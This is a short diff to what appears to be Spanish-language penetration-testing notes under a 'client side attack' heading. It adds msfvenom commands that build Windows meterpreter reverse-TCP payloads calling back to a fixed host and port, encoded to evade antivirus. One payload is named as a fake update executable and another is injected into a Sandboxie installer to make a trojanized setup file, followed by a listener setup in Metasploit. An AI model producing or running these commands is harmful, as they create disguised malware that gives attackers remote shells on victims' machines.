@@ -101,9 +101,19 @@ git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git
 ===================================================================================
 client side attack
 
+Archivo exe
+------------
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.151.189 LPORT=8888 
+-e x86/shikata_ga_nai -f exe -o payloads/msi-update.exe
+
+
+Archivo exe autoinstalable.
+-----------------------------
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.151.189 LPORT=8888 -e x86/shikata_ga_nai -i 10 -f raw > eoncode.bin
 
 msfvenom -p - -x SandboxieInstall.exe -k -f exe -a x86 --platform windows -e x86/bloxor -i 2 > sanbox.exe < eoncode.bin
+
+
 
 msf > use exploit/multi/handler
 msf > set payload windows/meterpreter/reverse_tcp
